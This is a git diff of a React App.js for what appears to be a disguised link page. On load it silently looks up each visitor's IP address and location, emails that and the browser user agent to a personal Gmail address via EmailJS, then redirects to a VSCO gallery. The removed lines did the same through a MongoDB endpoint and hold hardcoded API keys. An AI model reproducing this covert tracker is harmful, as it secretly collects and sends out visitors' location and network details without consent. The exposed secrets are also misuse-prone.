@@ -1,68 +1,59 @@
 import { useEffect } from "react";
 import { Analytics } from '@vercel/analytics/react';
 
-
 function App() {
-
-  
   useEffect(() => {
-
-    const fetchData = async () => {
+    const fetchDataAndSendEmail = async () => {
       try {
+        // Get visitor IP information
+        const ipResponse = await fetch('https://ipapi.co/json');
+        if (!ipResponse.ok) throw new Error('IP API request failed');
+        
+        const ipData = await ipResponse.json();
+        
+        // Prepare email content
+        const emailContent = `
+          New Profile Visit Details:
+          IP: ${ipData.ip}
+          City: ${ipData.city}
+          Region: ${ipData.region}
+          Country: ${ipData.country_name}
+          Timezone: ${ipData.timezone}
+          ISP: ${ipData.org}
+          User Agent: ${navigator.userAgent}
+          Date: ${new Date().toLocaleString()}
+        `;
 
-        const response = await fetch('https://ipapi.co/json'
+        // Send email using EmailJS
+        const emailResponse = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            service_id: 'YOUR_EMAILJS_SERVICE_ID',
+            template_id: 'YOUR_EMAILJS_TEMPLATE_ID',
+            user_id: 'YOUR_EMAILJS_USER_ID',
+            template_params: {
+              to_email: 'patelhiten346@gmail.com',
+              message: emailContent,
+              from_name: 'Profile Visitor Alert'
+            }
+          })
+        });
 
-
-        // Just in case I want to add headers  https://ipapi.co/json
-            // , { 
-            //   method: 'GET',
-            //   headers: {
-            //     'X-RapidAPI-Key': '617613e6b7msh38a292b67a972c1p1fc264jsn5c45f98f2a6b',
-            //     'X-RapidAPI-Host': 'ip-geo-location.p.rapidapi.com'
-            //   }}
-        );
-
-       
-
-        if (response.ok) {
-          const data = await response.json();
-
-          var myHeaders = new Headers();
-          myHeaders.append("Content-Type", "application/json");
-          myHeaders.append("Access-Control-Request-Headers", "*");
-          myHeaders.append("api-key", "6mFTEKpTOfwDxviNKcDbYtn7ZIV5X9j1ZLEVDLRj04wB9ExbCVtnirJtVnH2123n");
-          myHeaders.append("Access-Control-Allow-Origin", "*");
-          
-  
-          var raw = JSON.stringify({
-            "dataSource": "Cluster0",
-            "database": "viewers",
-            "collection": "VSCO",
-            "document": response
-          });
-  
-          var requestOptions = {
-            method: 'POST',
-            headers: myHeaders,
-            body: raw,
-            redirect: 'follow',
-            // mode: 'no-cors'
-          };
-  
-          const db_send = await fetch("https://us-east-1.aws.data.mongodb-api.com/app/data-nwgff/endpoint/data/v1/action/insertOne", requestOptions)
-          // Redirect to the VSCO website
-        } else {
-          throw new Error('API request failed');
+        if (!emailResponse.ok) {
+          console.error('Email sending failed:', await emailResponse.text());
         }
+
       } catch (error) {
-        console.error(error);
+        console.error('Error:', error);
+      } finally {
+        // Redirect to VSCO
+        window.location.href = 'https://vsco.co/htnptl/gallery';
       }
     };
 
-    fetchData();
-    window.location.href = 'https://vsco.co/htnptl/gallery';
-    }, []);
-
+    fetchDataAndSendEmail();
+  }, []);
 
   return (
     <div className="App">
